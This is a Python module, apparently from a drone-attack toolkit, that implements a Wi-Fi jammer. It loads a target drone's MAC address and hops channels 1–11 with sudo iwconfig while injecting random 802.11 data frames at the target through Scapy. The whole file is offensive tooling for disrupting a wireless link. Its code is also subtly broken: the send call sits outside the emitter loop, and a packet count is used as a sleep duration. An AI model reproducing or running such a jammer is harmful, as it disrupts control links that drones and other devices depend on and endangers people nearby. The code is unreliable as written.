import os
import json
import time
import random
import threading
from scapy.config import conf
from src.utils import sudo_exec
from scapy.sendrecv import sendp
from scapy.volatile import RandMAC
from scapy.layers.dot11 import RadioTap, Dot11

##################
### PREP MODULE ##
##################

class RFJammer:
    def __init__(self):

        # Get path to project root directory (two levels up from this file)
        target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
        scan_info = None

        # Intialize target drone data
        with open(target_data_file, 'r') as file:
            scan_info = json.load(file)

        target_info = scan_info.get("target_info", {})
        self.target_mac = target_info.get("mac_address")

        options_info = scan_info.get("options", {})
        self.packets = options_info.get("packets")
        self.interface = options_info.get("interface")

        # Scapy configuration
        conf.iface = self.interface
        conf.verb = 0 # Silent mode

        self.running = False
        self.dwell = 1

    def generate_noise(self):
        """
        Constructs random data packets to simulate RF noise.
        """

        sender_mac = RandMAC()

        payload = os.urandom(random.randint(500, 1000))

        packet = RadioTap() / \
                 Dot11(type=2, subtype=0, addr1=self.target_mac, addr2=sender_mac, addr3=self.target_mac) / \
                 payload
    
        return packet

    def channel_hopper(self, dwell):
        """
        Cycles through hardware channels.
        Runs in a dedicated thread.
        """

        channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]

        while self.running:
            for channel in channels:
                if not self.running:
                    break

                # Targeting specific channel
                sudo_exec(f"iwconfig {self.interface} channel {channel}")

                # Staying on channel for specific period before switching
                time.sleep(dwell)
    
    def packet_emitter(self):
        """
        Injects data packets through the current channel.
        Runs in a dedicated thread.
        """

        while self.running:
            pkt = self.generate_noise()
        
        try:
            sendp(pkt, iface=self.interface, count=1, verbose=False)
        except OSError:
            # Interface undergoing change
            pass
        except Exception as e:
            print(f"Error transmitting noise: {e}")

##################
## START MODULE ##
##################

print("Starting RF Jamming...")
jammer = RFJammer()

jammer.running = True

try: 
    # Start channel hopper thread

    hopper_thread = threading.Thread(target=jammer.channel_hopper, daemon=True)
    hopper_thread.start()

    # Start packet emitter thread

    emitter_thread = threading.Thread(target=jammer.packet_emitter, daemon=True)
    emitter_thread.start()

    time.sleep(jammer.packets)
except Exception as e:
    print("Error! Aborting jammer.")
finally:
    jammer.running = False
    hopper_thread.join(timeout=1)
    emitter_thread.join(timeout=1)